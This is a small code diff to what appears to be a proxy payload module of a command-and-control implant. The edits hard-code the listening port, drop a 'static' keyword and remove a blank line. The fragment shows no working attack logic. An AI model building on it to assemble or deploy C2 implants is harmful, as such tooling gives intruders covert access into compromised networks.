@@ -14,7 +14,7 @@
 #define INPUT_PORT 9080
 #endif
 
-#define INPUT_PORT HOST_PORT
+#define INPUT_PORT 9080
 
 typedef void(*output_func)(int, const char* fmt, ...); // For printing output on C2 server.
 /**
@@ -568,7 +568,7 @@ int handleClients(int serverSocket) {
 /**
      * Start proxy server.
      */
-    static int startProxy(int PORT = 1080) {
+    int startProxy(int PORT = 1080) {
 
         // Usually on port 1080
         int serverSocket;
@@ -631,7 +631,6 @@ int payload_init(int id, output_func output) {
     // output(id, )
 
     int serverSocket;
-
     if ((serverSocket = startProxy(INPUT_PORT)) == SOCKET_ERROR) {
     // if ((serverSocket = Sock5Proxy::startProxy(INPUT_PORT)) == SOCKET_ERROR) {
         return 1;
